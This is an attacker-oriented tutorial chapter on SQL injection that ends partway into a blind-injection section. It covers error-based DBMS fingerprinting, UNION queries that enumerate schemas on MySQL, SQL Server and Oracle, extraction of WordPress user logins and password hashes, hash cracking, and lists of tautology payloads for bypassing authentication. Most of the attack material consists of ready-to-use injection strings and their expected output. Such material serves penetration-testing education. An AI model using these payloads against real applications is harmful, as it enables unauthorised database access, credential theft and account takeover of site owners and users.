# Information Gathering and Schema Extraction Using UNION Queries

## Introduction: The Reconnaissance Phase

Before launching any actual exploit, skilled attackers perform thorough reconnaissance—what we call "footprinting" the target. This initial phase focuses on understanding the system's architecture, identifying potential vulnerabilities, and mapping attack surfaces. In the context of database-backed applications, this means extracting structural information about the database itself.

While information gathering through SQL isn't strictly classified as SQL injection, it represents a critical preparatory step. Attackers need to understand subtle differences between Database Management Systems (DBMSs) because each platform—MySQL, Microsoft SQL Server, Oracle, PostgreSQL—has unique characteristics, default tables, and syntax variations that affect how injection attacks must be crafted.

Let's visualize the information gathering hierarchy:

```
┌─────────────────────────────────────────────────────────────┐
│                    INFORMATION GATHERING                     │
│                          HIERARCHY                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Level 1: DBMS Identification                               │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  • Error message analysis                            │   │
│  │  • Version detection (@@VERSION, VERSION())          │   │
│  │  • Behavioral fingerprinting                         │   │
│  └─────────────────────────────────────────────────────┘   │
│                           ↓                                 │
│  Level 2: Schema Enumeration                                │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  • Database/instance listing                         │   │
│  │  • Table enumeration                                 │   │
│  │  • Column/field discovery                            │   │
│  └─────────────────────────────────────────────────────┘   │
│                           ↓                                 │
│  Level 3: Data Extraction                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  • Sensitive table identification                    │   │
│  │  • Record dumping                                    │   │
│  │  • Credential harvesting                             │   │
│  └─────────────────────────────────────────────────────┘   │
│                           ↓                                 │
│  Level 4: Privilege Escalation & Access                      │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  • Authentication bypass                             │   │
│  │  • Password cracking                                 │   │
│  │  • System compromise                                 │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## Phase 1: DBMS Identification Through Error Messages

The simplest yet often overlooked reconnaissance technique is triggering informative error messages. By deliberately submitting malformed input, attackers can coax the application into revealing its underlying technology stack.

### Technique: Syntax Violation

Consider a typical login form with username and password fields. An attacker might insert a single quote character into the username field:

```
Input to username field: admin'wrong
```

This produces malformed SQL similar to:

```sql
SELECT * FROM users WHERE username = 'admin'wrong' AND password = 'something'
```

The stray quote breaks the SQL syntax, and a poorly configured application might respond with:

```
┌─────────────────────────────────────────────────────────────┐
│                         ERROR MESSAGE                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  You have an error in your SQL syntax; check the manual     │
│  that corresponds to your MySQL server version for the      │
│  right syntax to use near 'wrong' AND password =            │
│  'something'' at line 1                                     │
│                                                             │
│  ⚠ KEY INFORMATION REVEALED:                               │
│  • DBMS: MySQL                                              │
│  • Query structure partially exposed                        │
│  • Single quote injection confirmed                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### What Different DBMS Errors Look Like

```
MySQL Error:
┌────────────────────────────────────────────────────────────┐
│ ERROR 1064 (42000): You have an error in your SQL syntax...│
│ → Clear identification: "MySQL server version"             │
└────────────────────────────────────────────────────────────┘

Microsoft SQL Server Error:
┌────────────────────────────────────────────────────────────┐
│ Microsoft OLE DB Provider for SQL Server error '80040e14'  │
│ Unclosed quotation mark after the character string...      │
│ → Identifiable by "OLE DB" and "SQL Server" references     │
└────────────────────────────────────────────────────────────┘

PostgreSQL Error:
┌────────────────────────────────────────────────────────────┐
│ ERROR: unterminated quoted string at or near "'wrong"      │
│ LINE 1: SELECT * FROM users WHERE username = 'admin'wrong' │
│ → Identifiable by "LINE" reference and specific wording    │
└────────────────────────────────────────────────────────────┘

Oracle Database Error:
┌────────────────────────────────────────────────────────────┐
│ ORA-01756: quoted string not properly terminated           │
│ → Identifiable by "ORA-" prefix                            │
└────────────────────────────────────────────────────────────┘
```

> **Modern Reality Check:** Well-configured applications today suppress detailed error messages, showing generic "An error occurred" pages instead. However, this technique remains worth attempting because configuration mistakes are surprisingly common, particularly in development, staging, or legacy environments.

---

## The UNION Command: Your Database Swiss Army Knife

The UNION operator is arguably the most versatile tool in SQL injection attacks. It allows attackers to append arbitrary query results to legitimate query output, effectively turning a data retrieval vulnerability into a comprehensive data extraction mechanism.

### UNION Fundamentals

The UNION command merges the result sets of two or more SELECT statements into a single result table. Think of it as stacking query results vertically:

```
┌─────────────────────────────────────────────────────────────┐
│                    HOW UNION WORKS                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Query 1: SELECT color, shape FROM objects WHERE color='blue'│
│  ┌───────────┬───────────┐                                  │
│  │  color    │  shape    │                                  │
│  ├───────────┼───────────┤                                  │
│  │  blue     │  circle   │                                  │
│  │  blue     │  square   │                                  │
│  └───────────┴───────────┘                                  │
│                         UNION                               │
│  Query 2: SELECT color, shape FROM objects WHERE color='red' │
│  ┌───────────┬───────────┐                                  │
│  │  color    │  shape    │                                  │
│  ├───────────┼───────────┤                                  │
│  │  red      │  triangle │                                  │
│  │  red      │  oval     │                                  │
│  └───────────┴───────────┘                                  │
│                         =                                   │
│  Final Result:                                              │
│  ┌───────────┬───────────┐                                  │
│  │  color    │  shape    │                                  │
│  ├───────────┼───────────┤                                  │
│  │  blue     │  circle   │                                  │
│  │  blue     │  square   │                                  │
│  │  red      │  triangle │                                  │
│  │  red      │  oval     │                                  │
│  └───────────┴───────────┘                                  │
└─────────────────────────────────────────────────────────────┘
```

### Critical UNION Requirements

```
┌─────────────────────────────────────────────────────────────┐
│              UNION RULES FOR SUCCESSFUL INJECTION           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Rule 1: Column Count Match                                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Both SELECT statements MUST return the same number  │   │
│  │ of columns.                                         │   │
│  │ ❌ SELECT a, b FROM t1 UNION SELECT x FROM t2       │   │
│  │ ✅ SELECT a, b FROM t1 UNION SELECT x, y FROM t2    │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Rule 2: Compatible Data Types                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Corresponding columns should have compatible types. │   │
│  │ Using NULL or literal numbers helps bypass this.    │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Rule 3: Determine Column Count First                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Use ORDER BY or NULL column addition to find the    │   │
│  │ exact number of columns in the original query.      │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Using Literal Values in UNION

Attackers often inject literal values to test column counts or display arbitrary data:

```sql
-- Original query (simplified):
SELECT color, shape FROM objects WHERE color='blue'

-- Injected UNION with literal values:
SELECT color, shape FROM objects WHERE color='blue' 
UNION 
SELECT 1, 2
```

This produces:

```
┌───────────┬───────────┐
│  color    │  shape    │
├───────────┼───────────┤
│  blue     │  circle   │
│  blue     │  square   │
│  1        │  2        │  ← Injected row with arbitrary values
└───────────┴───────────┘
```

This technique serves multiple purposes:
- **Column counting:** By incrementing numbers (SELECT 1; SELECT 1,2; SELECT 1,2,3...) until the query succeeds, attackers determine the original query's column count.
- **Position mapping:** The numbers reveal which column positions appear in the page output, identifying injectable display points.
- **Data display:** Arbitrary values can be replaced with actual database queries to extract information.

---

## Database Version Discovery

### MySQL/MariaDB Version Extraction

Using the previous Vicnum vulnerable application example, an attacker injects a UNION query to display the database version:

```
┌─────────────────────────────────────────────────────────────┐
│                 UNION VERSION INJECTION                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Original query (approximate):                              │
│  SELECT id, name, description FROM items WHERE id = [input] │
│                                                             │
│  Injected input:                                            │
│  ' UNION SELECT 1, @@VERSION, 3 -- -                       │
│                                                             │
│  Resulting executed query:                                  │
│  SELECT id, name, description FROM items WHERE id = ''      │
│  UNION                                                      │
│  SELECT 1, @@VERSION, 3 -- -                                │
│                                                             │
│  Application display:                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                                                     │   │
│  │  ID: 1                                             │   │
│  │  Name: 5.1.41-3ubuntu12.6-log  ← Version revealed!  │   │
│  │  Description: 3                                    │   │
│  │                                                     │   │
│  │  ⚠ Information Extracted:                          │   │
│  │  • MySQL version: 5.1.41                           │   │
│  │  • Operating System: Ubuntu 12.6 (Linux)           │   │
│  │  • Logging enabled ("-log")                        │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Version Commands Across DBMS Platforms

```
┌─────────────────────────────────────────────────────────────┐
│                 DBMS VERSION DETECTION COMMANDS             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  MySQL / MariaDB:                                          │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT @@VERSION;                                   │   │
│  │ SELECT VERSION();                                   │   │
│  │ → Returns: "5.7.32-0ubuntu0.18.04.1"                │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Microsoft SQL Server:                                     │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT @@VERSION;                                   │   │
│  │ → Returns detailed Windows + SQL Server info:       │   │
│  │   "Microsoft SQL Server 2019 (RTM) - 15.0.2000.5   │   │
│  │    on Windows Server 2019 Datacenter 10.0..."       │   │
│  │   ⚠ Also reveals OS version and patch level!       │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  PostgreSQL:                                               │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT VERSION();                                   │   │
│  │ → Returns: "PostgreSQL 13.1 on x86_64-pc-linux-gnu" │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Oracle Database:                                          │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT * FROM v$version;                           │   │
│  │ SELECT banner FROM v$version WHERE ROWNUM=1;       │   │
│  │ → Returns: "Oracle Database 19c Enterprise..."     │   │
│  │ NOTE: @@VERSION does NOT work in Oracle!           │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  SQLite:                                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT sqlite_version();                            │   │
│  │ → Returns: "3.34.0"                                │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## Schema Enumeration: Mapping the Database Landscape

Schema enumeration is the process of discovering all databases, tables, and columns within a DBMS. This provides attackers with a complete map of the data landscape, enabling targeted extraction.

### MySQL Schema Enumeration

MySQL provides the `information_schema` database, a treasure trove of metadata accessible to most users.

#### Step 1: Enumerate All Databases (Schemata)

```
┌─────────────────────────────────────────────────────────────┐
│           MYSQL SCHEMA ENUMERATION - DATABASES               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Injected payload:                                          │
│  ' UNION SELECT schema_name, NULL, NULL FROM                │
│  information_schema.schemata -- -                           │
│                                                             │
│  Equivalent full query:                                     │
│  SELECT schema_name FROM information_schema.schemata;       │
│                                                             │
│  Result (from multi-application shared server):             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  SCHEMA_NAME                                        │   │
│  ├─────────────────────────────────────────────────────┤   │
│  │  information_schema  ← MySQL system schema          │   │
│  │  mysql              ← MySQL internal                │   │
│  │  performance_schema ← Performance metrics           │   │
│  │  vicnum             ← Target vulnerable app         │   │
│  │  wordpress          ← Another application!          │   │
│  │  phpmyadmin         ← Database management tool      │   │
│  │  dvwa               ← Another vulnerable app        │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  ⚠ DANGER: Shared hosting environments expose ALL          │
│  applications' databases through a single injection point!  │
└─────────────────────────────────────────────────────────────┘
```

#### Step 2: Enumerate Tables Within a Target Schema

Targeting the discovered WordPress database:

```sql
-- The injection payload for targeting WordPress tables:
' UNION SELECT table_schema, table_name, NULL 
FROM information_schema.tables 
WHERE table_schema = 'wordpress' -- -
```

Visualized result:

```
┌─────────────────────────────────────────────────────────────┐
│        TABLES IN 'wordpress' SCHEMA                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  TABLE_SCHEMA    TABLE_NAME                                 │
│  ────────────────────────────────────────────               │
│  wordpress       wp_commentmeta                             │
│  wordpress       wp_comments                                │
│  wordpress       wp_links                                   │
│  wordpress       wp_options                                 │
│  wordpress       wp_postmeta                                │
│  wordpress       wp_posts                                   │
│  wordpress       wp_term_relationships                      │
│  wordpress       wp_term_taxonomy                           │
│  wordpress       wp_terms                                   │
│  wordpress       wp_usermeta                                │
│  wordpress       wp_users             ← HIGH VALUE TARGET!  │
│                                                             │
│  The wp_users table clearly contains user credentials.      │
└─────────────────────────────────────────────────────────────┘
```

### Microsoft SQL Server Schema Enumeration

MSSQL uses different system objects for metadata storage:

```
┌─────────────────────────────────────────────────────────────┐
│         MICROSOFT SQL SERVER SCHEMA ENUMERATION             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Step 1: List All Databases                                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT name FROM master..sysdatabases;              │   │
│  │                                                     │   │
│  │ Result:                                             │   │
│  │ ┌──────────────┐                                    │   │
│  │ │ NAME         │                                    │   │
│  │ ├──────────────┤                                    │   │
│  │ │ master       │                                    │   │
│  │ │ tempdb       │                                    │   │
│  │ │ model        │                                    │   │
│  │ │ msdb         │                                    │   │
│  │ │ target_db    │  ← Application database            │   │
│  │ └──────────────┘                                    │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Step 2: List User Tables in target_db                      │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT name FROM target_db..sysobjects              │   │
│  │ WHERE xtype = 'U';  -- 'U' = User-defined table     │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Complete xtype Reference:                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ xtype │ Object Type                                 │   │
│  ├───────┼─────────────────────────────────────────────┤   │
│  │  C    │ CHECK constraint                            │   │
│  │  D    │ DEFAULT constraint                          │   │
│  │  F    │ FOREIGN KEY constraint                      │   │
│  │  L    │ Log                                         │   │
│  │  P    │ Stored procedure                            │   │
│  │  PK   │ PRIMARY KEY constraint (K)                  │   │
│  │  RF   │ Replication filter stored procedure         │   │
│  │  S    │ System table                                │   │
│  │  TR   │ Trigger                                     │   │
│  │  U    │ User table  ← Most interesting for attackers│   │
│  │  UQ   │ UNIQUE constraint (K)                       │   │
│  │  V    │ View                                        │   │
│  │  X    │ Extended stored procedure                   │   │
│  └───────┴─────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Oracle Database Schema Enumeration

Oracle's architecture differs fundamentally from MySQL and MSSQL, using a more compartmentalized structure:

```
┌─────────────────────────────────────────────────────────────┐
│            ORACLE DATABASE SCHEMA ENUMERATION               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Key Differences from MySQL/MSSQL:                          │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ • No single "information_schema" equivalent         │   │
│  │ • Databases are more strictly isolated              │   │
│  │ • Privileges heavily control visibility             │   │
│  │ • Enumeration scope depends on user permissions     │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Getting Current Database Name (Multiple Methods):          │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT name FROM v$database;                        │   │
│  │ SELECT global_name FROM global_name;                │   │
│  │ SELECT SYS.DATABASE_NAME FROM DUAL;                 │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  The DUAL Table Explained:                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ DUAL is a special one-row, one-column dummy table:  │   │
│  │                                                     │   │
│  │ SELECT * FROM DUAL;                                 │   │
│  │ ┌─────┐                                            │   │
│  │ │ DUMMY│                                           │   │
│  │ ├─────┤                                            │   │
│  │ │  X  │                                            │   │
│  │ └─────┘                                            │   │
│  │                                                     │   │
│  │ Used for selecting constants/expressions:           │   │
│  │ SELECT 1+1 FROM DUAL;  → Returns: 2                │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Listing Accessible Tables:                                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT table_name, owner FROM all_tables;           │   │
│  │ -- Shows all tables the current user can access     │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Listing Columns for Discovered Tables:                     │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT column_name FROM all_tab_columns             │   │
│  │ WHERE table_name = 'TARGET_TABLE';                 │   │
│  │ -- Often needs filtering due to large result sets   │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Cross-DBMS Schema Enumeration Summary

```
┌─────────────────────────────────────────────────────────────┐
│           SCHEMA ENUMERATION COMPARISON MATRIX              │
├───────────────────┬───────────────────┬───────────────────┤
│     MySQL         │    MS SQL Server  │   Oracle Database │
├───────────────────┼───────────────────┼───────────────────┤
│ List DBs:         │ List DBs:         │ Current DB:       │
│ SELECT            │ SELECT name FROM  │ SELECT name FROM  │
│ schema_name FROM  │ master..sysdata-  │ v$database;       │
│ information_schema│ bases;            │                   │
│ .schemata;        │                   │                   │
├───────────────────┼───────────────────┼───────────────────┤
│ List Tables:      │ List Tables:      │ List Tables:      │
│ SELECT table_name │ SELECT name FROM  │ SELECT table_name │
│ FROM information_ │ db..sysobjects    │ FROM all_tables;  │
│ schema.tables     │ WHERE xtype='U';  │                   │
├───────────────────┼───────────────────┼───────────────────┤
│ List Columns:     │ List Columns:     │ List Columns:     │
│ SELECT column_name│ SELECT name FROM  │ SELECT column_name│
│ FROM information_ │ db..syscolumns    │ FROM all_tab_     │
│ schema.columns    │ WHERE id=OBJECT_  │ columns WHERE     │
│                   │ ID('table');      │ table_name='X';   │
└───────────────────┴───────────────────┴───────────────────┘
```

---

## Database Dumping: Extracting Sensitive Data

Once the schema is fully mapped, attackers proceed to extract table contents. This follows a systematic drill-down approach.

### The Drill-Down Extraction Process

```
┌─────────────────────────────────────────────────────────────┐
│                DATABASE DUMPING WORKFLOW                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Phase 1: Database Discovery                                │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ ['information_schema', 'mysql', 'wordpress', ...]   │   │
│  └─────────────────────────────────────────────────────┘   │
│                           ↓                                 │
│  Phase 2: Target Table Selection                            │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Database: wordpress                                 │   │
│  │ Tables: [wp_users, wp_posts, wp_options, ...]       │   │
│  │ → Selecting wp_users (high-value target)            │   │
│  └─────────────────────────────────────────────────────┘   │
│                           ↓                                 │
│  Phase 3: Column Enumeration                                │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Table: wp_users                                     │   │
│  │ Columns discovered:                                 │   │
│  │ ┌──────────────────────────────────────────────┐   │   │
│  │ │ ID              │ bigint(20) unsigned        │   │   │
│  │ │ user_login      │ varchar(60)  ← USERNAMES   │   │   │
│  │ │ user_pass       │ varchar(64)  ← PASSWORDS   │   │   │
│  │ │ user_nicename   │ varchar(50)                │   │   │
│  │ │ user_email      │ varchar(100) ← EMAILS      │   │   │
│  │ │ user_registered │ datetime                   │   │   │
│  │ │ display_name    │ varchar(250)               │   │   │
│  │ └──────────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────────┘   │
│                           ↓                                 │
│  Phase 4: Data Extraction                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT ID, display_name, user_login, user_pass      │   │
│  │ FROM wordpress.wp_users;                            │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Complete Column Enumeration Example

To enumerate columns of the `wp_users` table:

```sql
-- Injected UNION query:
' UNION SELECT table_schema, table_name, column_name 
FROM information_schema.columns 
WHERE table_name = 'wp_users' -- -
```

Visual result:

```
┌─────────────────────────────────────────────────────────────┐
│         COLUMNS OF 'wordpress.wp_users'                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  TABLE_SCHEMA │ TABLE_NAME │ COLUMN_NAME                    │
│  ────────────────────────────────────────────────────────── │
│  wordpress    │ wp_users   │ ID                              │
│  wordpress    │ wp_users   │ user_login       ← USERNAMES    │
│  wordpress    │ wp_users   │ user_pass        ← PASSWORDS!   │
│  wordpress    │ wp_users   │ user_nicename                   │
│  wordpress    │ wp_users   │ user_email       ← EMAILS       │
│  wordpress    │ wp_users   │ user_url                        │
│  wordpress    │ wp_users   │ user_registered                 │
│  wordpress    │ wp_users   │ user_activation_key             │
│  wordpress    │ wp_users   │ user_status                     │
│  wordpress    │ wp_users   │ display_name                    │
│                                                             │
│  ⚠ CRITICAL FINDING: user_login + user_pass =               │
│  Complete credential harvest opportunity!                    │
└─────────────────────────────────────────────────────────────┘
```

### Final Data Extraction Query

```sql
-- Full extraction of user credentials:
' UNION SELECT ID, display_name, user_login, user_pass 
FROM wordpress.wp_users -- -
```

Results displayed in the vulnerable application:

```
┌─────────────────────────────────────────────────────────────┐
│              EXTRACTED USER CREDENTIALS                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ID │ DISPLAY_NAME │ USER_LOGIN │ USER_PASS                 │
│  ───┼──────────────┼────────────┼────────────────────────── │
│  1  │ admin        │ admin      │ $P$BfJcFqKvZqJ2x7v...   │
│  2  │ editor       │ editor     │ $P$B5f3kLmQwR8pZ9y...   │
│  3  │ subscriber   │ subscriber │ $P$B9hG5dKlJ6sW1aN...   │
│                                                             │
│  Password Hash Analysis:                                    │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Hash format: $P$B...                                │   │
│  │ → WordPress phpass/MD5 hash                         │   │
│  │ → Crackable with: hashcat, John the Ripper          │   │
│  │ → Dictionary/brute-force attacks possible           │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## Privilege Escalation and Authentication Bypass

### Understanding Database Authentication

Most web applications use databases for authentication by comparing user-supplied credentials against stored records:

```
┌─────────────────────────────────────────────────────────────┐
│            NORMAL AUTHENTICATION FLOW                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. User submits credentials:                               │
│     Username: admin                                         │
│     Password: mypassword123                                 │
│                                                             │
│  2. Application constructs query:                           │
│     SELECT * FROM users                                     │
│     WHERE username = 'admin'                                │
│     AND password = 'mypassword123';                         │
│                                                             │
│  3. Database checks for matching record:                    │
│     ┌─────────────────────────────────────────────────┐    │
│     │ Record found → User authenticated ✓             │    │
│     │ No record → Authentication failed ✗             │    │
│     └─────────────────────────────────────────────────┘    │
│                                                             │
│  4. Vulnerable query construction (PHP example):            │
│     $query = "SELECT * FROM users WHERE username = '"       │
│              . $_POST['username'] . "' AND password = '"    │
│              . $_POST['password'] . "'";                    │
│     ⚠ No sanitization = Direct injection possible!          │
└─────────────────────────────────────────────────────────────┘
```

### Password Hash Cracking

The extracted WordPress admin hash can be cracked:

```
┌─────────────────────────────────────────────────────────────┐
│              PASSWORD CRACKING PROCESS                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Hash: $P$BfJcFqKvZqJ2x7v...                               │
│                                                             │
│  Tools available:                                           │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ • hashcat (GPU-accelerated)                         │   │
│  │ • John the Ripper (CPU-based)                       │   │
│  │ • Online services (ethical concerns apply)          │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Attack approaches:                                         │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 1. Dictionary attack (common passwords list)        │   │
│  │ 2. Brute-force (all combinations)                   │   │
│  │ 3. Rainbow tables (pre-computed hashes)             │   │
│  │ 4. Rule-based (password patterns + mutations)       │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Successful crack → admin:admin                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ ⚠ Weak password "admin" cracked in milliseconds!    │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Authentication achieved:                                    │
│  ┌─────────────────────────────────────────────────────┐   │
│  │   WordPress Admin Panel                             │   │
│  │   ┌───────────────────────────────────────────┐    │   │
│  │   │ ✓ Logged in as admin                      │    │   │
│  │   │ ✓ Full administrative privileges           │    │   │
│  │   │ ✓ Can modify site, install plugins, etc.  │    │   │
│  │   └───────────────────────────────────────────┘    │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Authentication Bypass Using SQL Injection

Rather than extracting and cracking passwords, attackers can bypass authentication entirely.

#### The Tautology Attack

A tautology is a logical expression that always evaluates to TRUE. In SQL injection, this principle can force authentication queries to return records regardless of the actual credentials.

```
┌─────────────────────────────────────────────────────────────┐
│            TAUTOLOGY-BASED AUTHENTICATION BYPASS            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Original query structure:                                  │
│  SELECT * FROM users                                       │
│  WHERE username = '[INPUT]' AND password = '[INPUT]';      │
│                                                             │
│  Step 1: Attacker enters in username field:                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ x' OR '1'='1' -- -                                  │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Step 2: Resulting query becomes:                           │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SELECT * FROM users                                 │   │
│  │ WHERE username = 'x' OR '1'='1' -- -'              │   │
│  │ AND password = '[anything]';                        │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Step 3: Logical analysis:                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                                                     │   │
│  │  WHERE username = 'x'  → FALSE                      │   │
│  │          OR                                         │   │
│  │         '1'='1'         → TRUE                      │   │
│  │          ─────────────────────                      │   │
│  │  FALSE OR TRUE = TRUE ✓                             │   │
│  │                                                     │   │
│  │  Everything after -- is a comment, ignored by DB    │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Step 4: Query returns ALL user records:                    │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Application logic: "If records returned → OK"       │   │
│  │ → Authentication bypassed!                         │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Common Authentication Bypass Payloads

```
┌─────────────────────────────────────────────────────────────┐
│        COMMON SQL INJECTION AUTH BYPASS PAYLOADS            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Basic Tautologies:                                         │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ ' OR '1'='1' -- -                                   │   │
│  │ ' OR '1'='1' #       (MySQL comment variant)        │   │
│  │ ' OR 1=1 -- -        (Numeric comparison)           │   │
│  │ " OR "1"="1" -- -    (Double-quote variant)         │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Known-User Targeting:                                      │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ admin' -- -          (Comment out password check)   │   │
│  │ admin' #             (MySQL variant)                │   │
│  │ ' OR username='admin' -- -                          │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  WITH KNOWLEDGE THAT BOTH FIELDS MUST BE POPULATED:         │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Username: app_serv_01' OR '1'='1                    │   │
│  │ Password: app_serv_02' OR '1'='1                    │   │
│  │                                                     │   │
│  │ Resulting query:                                    │   │
│  │ ...WHERE username='app_serv_01' OR '1'='1'         │   │
│  │ AND password='app_serv_02' OR '1'='1'              │   │
│  │ → TRUE AND TRUE = TRUE ✓                           │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  DBMS-SPECIFIC COMMENT SYNTAX:                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ MySQL:     -- -  or  #                              │   │
│  │ MSSQL:     -- -                                     │   │
│  │ PostgreSQL: -- -  or  /* */                          │   │
│  │ Oracle:    -- -  or  /* */                          │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## Blind SQL Injection

When applications don't directly display query results, attackers must use indirect techniques to extract information. This is blind SQL injection.

### Understanding the Blind Scenario

```
┌─────────────────────────────────────────────────────────────┐
│          BLIND vs. NON-BLIND SQL INJECTION                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Non-Blind (Visible Output):                                │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ App displays query results → Attackers see data!    │   │
│  │                                                     │   │
│  │  Input: ' UNION SELECT password FROM users -- -     │   │
│  │  Output:  ┌──────────────┐                          │   │
│  │           │ 5f4dcc3b...  │  ← Hash visible!         │   │
│  │           └──────────────┘                          │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Blind (No Direct Output):                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ App shows generic pages → No data visible!          │   │
│  │                                                     │   │
│  │  Input: ' UNION SELECT password FROM users -- -     │   │
│  │  Output: "Welcome back!" or "Error occurred"        │   │
│  │         No query results displayed!                 │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Solution: INFERENCE ATTACK                                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Extract data ONE BIT at a time by observing          │   │
│  │ behavioral differences in responses                 │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Boolean-Based Blind SQL Injection

This technique exploits the difference in application behavior when a condition is TRUE vs. FALSE.

```
┌─────────────────────────────────────────────────────────────┐
│            BOOLEAN-BASED BLIND INJECTION                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Step 1: Confirm Injectability                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Test TRUE condition:                                │   │
│  │ ' AND '1'='1' -- -                                  │   │
│  │ → Application responds normally (TRUE)              │   │
│  │                                                     │   │
│  │ Test FALSE condition:                               │   │
│  │ ' AND '1'='2' -- -                                  │   │
│  │ → Application responds differently (FALSE)          │   │
│  │                                                     │   │
│  │ Different responses = SQL injection confirmed!      │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Step 2: Extract Data Character by Character                │
│  ┌─────────────────────────────────────────────────────┐   │
